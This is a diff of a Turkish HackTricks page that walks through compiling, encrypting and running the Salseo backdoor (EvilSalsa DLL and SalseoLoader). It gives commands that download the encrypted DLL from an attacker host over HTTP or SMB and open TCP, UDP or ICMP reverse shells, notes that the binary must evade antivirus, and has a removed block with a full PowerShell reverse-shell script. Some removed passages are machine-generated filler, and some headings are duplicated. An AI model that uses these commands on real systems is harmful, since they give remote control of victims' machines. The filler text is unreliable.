@@ -2,37 +2,37 @@
 
 <details>
 
-<summary><strong>AWS hacklemeyi sıfırdan kahramanla öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
+<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>
 
 HackTricks'ı desteklemenin diğer yolları:
 
-* **Şirketinizi HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
-* [**Resmi PEASS & HackTricks ürünleri**](https://peass.creator-spring.com) edinin
-* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'ı **takip edin**.
-* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.
+* **Şirketinizi HackTricks'te reklam görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
+* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
+* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
 
-## Derlemeleri Hazırlama
+## Derlemeleri Derleme
 
-Kaynak kodunu github'dan indirin ve **EvilSalsa** ve **SalseoLoader**'ı derleyin. Kodu derlemek için **Visual Studio** yüklü olması gerekmektedir.
+Kaynak kodunu github'dan indirin ve **EvilSalsa** ve **SalseoLoader**'ı derleyin. Kodu derlemek için **Visual Studio**'nun yüklü olması gerekmektedir.
 
-Bu projeleri, kullanacak olduğunuz Windows makinenin mimarisi için derleyin (Windows x64 destekliyorsa, onun için derleyin).
+Bu projeleri, kullanacak olduğunuz Windows işletim sisteminin mimarisi için derleyin (Windows x64'ü destekliyorsa, bu mimari için derleyin).
 
-Visual Studio içinde **sol "Build" sekmesindeki "Platform Target"** seçeneğini kullanarak **mimariyi seçebilirsiniz**.
+Mimariyi Visual Studio içinde **sol "Build" sekmesindeki "Platform Target" bölümünden seçebilirsiniz.**
 
-(\*\*Bu seçenekleri bulamazsanız, **"Project Tab"** üzerine tıklayın ve ardından **"\<Project Name> Properties"** seçeneğine tıklayın)
+(\*\*Bu seçenekleri bulamazsanız, **"Project Tab"** üzerine tıklayın ve ardından **"\<Project Name> Properties"**'e tıklayın)
 
 ![](<../.gitbook/assets/image (132).png>)
 
-Ardından, her iki projeyi de derleyin (Build -> Build Solution) (Loglarda yürütülebilir dosyanın yolunu göreceksiniz):
+Ardından, her iki projeyi derleyin (Build -> Build Solution) (Log içinde yürütülebilir dosyanın yolunu göreceksiniz):
 
 ![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)
 
 ## Arka Kapıyı Hazırlama
 
-Öncelikle, **EvilSalsa.dll**'yi kodlamalısınız. Bunun için, python betiği **encrypterassembly.py**'yi kullanabilir veya **EncrypterAssembly** projesini derleyebilirsiniz:
+İlk olarak, **EvilSalsa.dll**'yi kodlamalısınız. Bunu yapmak için **encrypterassembly.py** adlı python betiğini kullanabilir veya **EncrypterAssembly** projesini derleyebilirsiniz:
 
 ### **Python**
 ```
@@ -41,99 +41,32 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 ```
 ### Windows
 
-Windows işletim sistemi, birçok farklı backdoor yöntemiyle hedef alınabilir. Bu bölümde, Windows sistemlerine sızma ve backdoor oluşturma tekniklerini ele alacağız.
-
-#### 1. Netcat
-
-Netcat, birçok işletim sistemi üzerinde çalışabilen bir ağ aracıdır. Bir backdoor oluşturmak için kullanılabilir. Netcat'i hedef Windows makinesine yüklemek için aşağıdaki adımları izleyin:
-
-1. Netcat'i indirin ve hedef Windows makinesine kopyalayın.
-2. Komut istemini açın ve Netcat'in bulunduğu dizine gidin.
-3. Aşağıdaki komutu kullanarak Netcat'i hedef Windows makinesine yükleyin:
-
-   ```
-   nc.exe -lvp <port>
-   ```
-
-   `<port>` yerine kullanmak istediğiniz bir port numarası belirleyin.
-
-4. Netcat, hedef Windows makinesinde bir dinleme noktası oluşturacak ve gelen bağlantıları kabul edecektir.
-
-#### 2. Metasploit Framework
-
-Metasploit Framework, güvenlik testleri ve sızma testleri için kullanılan popüler bir araçtır. Metasploit Framework kullanarak Windows sistemlere sızma ve backdoor oluşturma işlemlerini gerçekleştirebilirsiniz. Aşağıdaki adımları izleyerek Metasploit Framework'ü kullanabilirsiniz:
-
-1. Metasploit Framework'ü indirin ve kurun.
-2. Metasploit Framework'ün konsol arayüzünü açın.
-3. Hedef Windows makinesinin IP adresini ve port numarasını belirleyin.
-4. Aşağıdaki komutu kullanarak hedef Windows makinesine bağlanın:
-
-   ```
-   use exploit/windows/<exploit_name>
-   set RHOSTS <target_ip>
-   set RPORT <target_port>
-   exploit
-   ```
-
-   `<exploit_name>` yerine kullanmak istediğiniz bir exploit adı belirleyin. `<target_ip>` ve `<target_port>` ise hedef Windows makinesinin IP adresi ve port numarasıdır.
-
-5. Metasploit Framework, hedef Windows makinesine bağlanacak ve backdoor oluşturacaktır.
-
-#### 3. PowerShell
-
-PowerShell, Windows işletim sisteminde yerleşik olarak bulunan bir komut satırı aracıdır. PowerShell'i kullanarak Windows sistemlere sızma ve backdoor oluşturma işlemlerini gerçekleştirebilirsiniz. Aşağıdaki adımları izleyerek PowerShell'i kullanabilirsiniz:
-
-1. Komut istemini açın ve aşağıdaki komutu kullanarak PowerShell'i başlatın:
-
-   ```
-   powershell
-   ```
-
-2. PowerShell'de aşağıdaki komutu kullanarak hedef Windows makinesine bağlanın:
-
-   ```
-   $client = New-Object System.Net.Sockets.TCPClient("<target_ip>", <target_port>)
-   $stream = $client.GetStream()
-   [byte[]]$bytes = 0..65535|%{0}
-   while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-       $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
-       $sendback = (iex $data 2>&1 | Out-String )
-       $sendback2 = $sendback + "PS " + (pwd).Path + "> "
-       $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
-       $stream.Write($sendbyte,0,$sendbyte.Length)
-       $stream.Flush()
-   }
-   $client.Close()
-   ```
-
-   `<target_ip>` ve `<target_port>` yerine hedef Windows makinesinin IP adresi ve port numarasını belirleyin.
-
-3. PowerShell, hedef Windows makinesine bağlanacak ve backdoor oluşturacaktır.
+### Windows
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
-Tamam, şimdi Salseo işlemini gerçekleştirmek için ihtiyacınız olan her şeye sahipsiniz: **kodlanmış EvilDalsa.dll** ve **SalseoLoader'ın ikili dosyası**.
+Şimdi Salseo işlemini gerçekleştirmek için ihtiyacınız olan her şeye sahipsiniz: **şifrelenmiş EvilDalsa.dll** ve **SalseoLoader'ın ikili dosyası.**
 
 **SalseoLoader.exe ikili dosyasını makineye yükleyin. Herhangi bir AV tarafından tespit edilmemeleri gerekiyor...**
 
-## **Arka kapıyı çalıştırma**
+## **Arka kapıyı çalıştırın**
 
-### **TCP ters kabuk almak (HTTP üzerinden kodlanmış dll indirme)**
+### **TCP ters kabuk almak (şifrelenmiş dll'yi HTTP aracılığıyla indirme)**
 
-Unutmayın, ters kabuk dinleyici olarak bir nc başlatın ve kodlanmış evilsalsa'yı sunmak için bir HTTP sunucusu çalıştırın.
+Ters kabuk dinleyici olarak nc başlatmayı ve şifrelenmiş evilsalsa'yı sunmak için bir HTTP sunucusu başlatmayı unutmayın.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
-### **UDP ters kabuk alma (SMB üzerinden kodlanmış dll indirme)**
+### **Bir UDP ters kabuk almak (SMB üzerinden kodlanmış dll indirme)**
 
-Ters kabuk dinleyici olarak nc'yi başlatmayı ve kodlanmış evilsalsa'yı sunmak için bir SMB sunucusu (impacket-smbserver) başlatmayı unutmayın.
+Ters kabuk dinleyicisi olarak nc'yi başlatmayı ve kodlanmış evilsalsa'yı sunmak için bir SMB sunucusu başlatmayı unutmayın (impacket-smbserver).
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
-### **ICMP ters kabuk alma (kurbanın içinde kodlanmış dll zaten bulunuyor)**
+### **ICMP ters kabuk almak (kurbanın içinde zaten kodlanmış dll bulunmaktadır)**
 
-**Bu sefer ters kabuğu almak için istemci tarafında özel bir araca ihtiyacınız var. İndirin:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
+**Bu sefer ters kabuk almak için istemci tarafında özel bir araca ihtiyacınız olacak. İndirin:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
 #### **ICMP Yanıtlarını Devre Dışı Bırakın:**
 ```
@@ -142,53 +75,47 @@ sysctl -w net.ipv4.icmp_echo_ignore_all=1
 #You finish, you can enable it again running:
 sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
-#### İstemciyi çalıştırın:
-
-```bash
-./client
-```
-
-Bu komut, istemci uygulamasını çalıştıracaktır.
+#### Müşteriyi çalıştırın:
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
-#### Kurbanın içinde, salseo işlemini gerçekleştirelim:
+#### Kurbanın içinde, salseo şeyini çalıştıralım:
 ```
 SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 ```
-## SalseoLoader'ı ana fonksiyonu dışa aktaran DLL olarak derleme
+## SalseoLoader'ı ana işlevi dışa aktaran DLL olarak derleme
 
 Visual Studio kullanarak SalseoLoader projesini açın.
 
-### Ana fonksiyondan önce \[DllExport] ekleyin
+### Ana işlevden önce ekle: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### Bu projeye DllExport yükleyin
 
 #### **Araçlar** --> **NuGet Paket Yöneticisi** --> **Çözüm için NuGet Paketlerini Yönet...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **DllExport paketini arayın (Gözat sekmesini kullanarak) ve Yükle'yi tıklayın (ve açılan pencereyi kabul edin)**
+#### **DllExport paketini arayın (Gözat sekmesini kullanarak) ve Yükle'yi seçin (ve açılan pencereyi kabul edin)**
 
-![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-Proje klasörünüzde **DllExport.bat** ve **DllExport\_Configure.bat** dosyaları görünecektir.
+Projelerinizin klasöründe **DllExport.bat** ve **DllExport\_Configure.bat** dosyaları görünmelidir.
 
 ### DllExport'u kaldırın
 
-**Kaldır**'ı tıklayın (evet, garip gelebilir ama bana güvenin, gereklidir)
+**Kaldır**'ı seçin (evet, tuhaf ama bana güvenin, gerekli)
 
 ![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)
 
 ### Visual Studio'yu kapatın ve DllExport\_configure'ı çalıştırın
 
-Visual Studio'yu **kapatın**
+Sadece **Visual Studio'yu kapatın**
 
 Ardından, **SalseoLoader klasörüne** gidin ve **DllExport\_Configure.bat**'ı çalıştırın
 
-**x64**'ü seçin (eğer bir x64 kutusu içinde kullanacaksanız, benim durumumda öyleydi), **System.Runtime.InteropServices**'i (DllExport için Namespace içinde) seçin ve **Uygula**'yı tıklayın
+**x64**'ü seçin (eğer x64 kutusunda kullanacaksanız, benim durumumda olduğu gibi), **System.Runtime.InteropServices**'ı seçin (**DllExport için Namespace** içinde) ve **Uygula**'yı seçin
 
 ![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)
 
@@ -200,25 +127,25 @@ Ardından, **SalseoLoader klasörüne** gidin ve **DllExport\_Configure.bat**'ı
 
 ### Çözümü derleyin
 
-**Çıktı Türü = Sınıf Kitaplığı**'nı seçin (Proje --> SalseoLoader Özellikleri --> Uygulama --> Çıktı türü = Sınıf Kitaplığı)
+**Çıkış Türü = Sınıf Kitaplığı** seçin (Proje --> SalseoLoader Özellikleri --> Uygulama --> Çıkış türü = Sınıf Kitaplığı)
 
 ![](<../.gitbook/assets/image (10) (1).png>)
 
-**x64** **platformunu** seçin (Proje --> SalseoLoader Özellikleri --> Derleme --> Platform hedefi = x64)
+**x64 platformunu** seçin (Proje --> SalseoLoader Özellikleri --> Derleme --> Platform hedefi = x64)
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
-Çözümü derlemek için: Derle --> Çözümü Derle (Yeni DLL'nin yolunu Çıktı konsolunda göreceksiniz)
+Çözümü derlemek için: Derle --> Çözümü Derle (Çıktı konsolunda yeni DLL'nin yolu görünecektir)
 
 ### Oluşturulan Dll'yi test edin
 
 Dll'yi test etmek istediğiniz yere kopyalayın ve yapıştırın.
 
-Şunu çalıştırın:
+Çalıştır:
 ```
 rundll32.exe SalseoLoader.dll,main
 ```
-Eğer herhangi bir hata görünmüyorsa, muhtemelen işlevsel bir DLL'ye sahipsiniz!!
+Eğer hata görünmüyorsa, muhtemelen işlevsel bir DLL'niz var!!
 
 ## DLL kullanarak bir kabuk alın
 
@@ -235,13 +162,7 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It allows users to interact with the operating system by executing commands. CMD provides a wide range of commands that can be used to perform various tasks, such as managing files and directories, running programs, configuring system settings, and more.
-
-CMD is a powerful tool for both legitimate users and hackers. It can be used to execute malicious commands and carry out various hacking activities. Hackers can leverage CMD to create backdoors, gain unauthorized access to systems, execute remote commands, and perform other malicious actions.
-
-As a hacker, it is important to understand CMD and its capabilities. By mastering CMD commands and techniques, you can effectively exploit vulnerabilities, gain control over systems, and achieve your hacking objectives. However, it is crucial to use this knowledge responsibly and ethically, adhering to legal and ethical boundaries.
-
-In summary, CMD is a command-line interpreter in Windows that can be used for legitimate purposes as well as for hacking activities. Understanding CMD and its commands is essential for hackers to carry out successful attacks and achieve their objectives.
+### CMD
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
@@ -252,14 +173,14 @@ rundll32.exe SalseoLoader.dll,main
 ```
 <details>
 
-<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>
+<summary><strong>Sıfırdan kahramana kadar AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
 
 HackTricks'ı desteklemenin diğer yolları:
 
-* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
+* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin**.
-* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.
+* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **bizi** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin**.
+* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
